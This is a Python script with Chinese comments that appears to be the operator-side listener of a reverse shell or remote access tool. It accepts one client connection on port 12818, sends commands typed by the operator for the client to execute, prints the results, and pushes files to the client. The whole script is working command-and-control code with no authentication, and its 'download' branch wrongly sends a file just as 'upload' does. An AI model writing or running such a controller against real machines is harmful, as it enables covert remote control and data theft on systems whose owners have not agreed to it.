import socket
import subprocess
import threading
import os
import time

# 全局变量，用于跟踪是否已经有客户端连接
connected_client = None

def handle_client(client_socket, base_dir):
    global connected_client
    current_dir = base_dir

    while True:
        try:
            # 接收客户端发送的请求（这里可以添加认证机制）
            request = client_socket.recv(1024)
            if not request:
                break
            request = request.decode('utf-8', errors='ignore')  # 使用errors='ignore'忽略解码错误
            if request.lower() == 'ready':
                while True:
                    # 发送命令到客户端
                    command = input(f"{current_dir}> ")
                    if not command.strip():
                        continue
                    if command.lower().startswith('cd '):
                        # 处理cd命令
                        path = command[3:]
                        path = os.path.expanduser(path)
                        path = os.path.abspath(path)
                        if os.path.isdir(path):
                            current_dir = path
                        else:
                            print("No such directory")
                        continue
                    elif command.lower().startswith('upload '):
                        # 处理上传命令
                        file_path = command[7:]
                        if os.path.isfile(file_path):
                            file_size = os.path.getsize(file_path)
                            client_socket.send(f"UPLOAD {file_path} {file_size}".encode('utf-8'))
                            with open(file_path, 'rb') as f:
                                while True:
                                    bytes_read = f.read(4096)
                                    if not bytes_read:
                                        break
                                    client_socket.sendall(bytes_read)
                            print(f"File {file_path} uploaded.")
                        else:
                            print("File not found.")
                        continue
                    elif command.lower().startswith('download '):
                        # 处理下载命令
                        file_path = command[9:]
                        if os.path.isfile(file_path):
                            file_size = os.path.getsize(file_path)
                            client_socket.send(f"DOWNLOAD {file_path} {file_size}".encode('utf-8'))
                            with open(file_path, 'rb') as f:
                                while True:
                                    bytes_read = f.read(4096)
                                    if not bytes_read:
                                        break
                                    client_socket.sendall(bytes_read)
                            print(f"File {file_path} downloaded.")
                        else:
                            print("File not found.")
                        continue
                    elif command.lower() == 'exit':
                        client_socket.send(command.encode('utf-8'))
                        break
                    else:
                        client_socket.send(command.encode('utf-8'))
                        # 接收命令执行结果
                        output = client_socket.recv(4096)
                        if output:
                            print(output.decode('utf-8', errors='ignore'))
                        else:
                            print("No output received")
            else:
                print("Invalid request")
                break
        except Exception as e:
            print(f"Error: {e}")
            break
    client_socket.close()
    connected_client = None  # 重置连接状态

def main():
    global connected_client  # Declare connected_client as global
    host = '0.0.0.0'  # 监听所有可用的接口
    port = 12818
    base_dir = os.getcwd()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening as {host}:{port}")

    while True:
        client, address = server.accept()
        print(f"[*] Accepted connection from {address[0]}:{address[1]}")
        if connected_client is None:
            connected_client = client
            client_handler = threading.Thread(target=handle_client, args=(client, base_dir))
            client_handler.start()
        else:
            print(f"[*] Another client is already connected. Closing connection from {address[0]}:{address[1]}")
            client.close()

if __name__ == '__main__':
    main()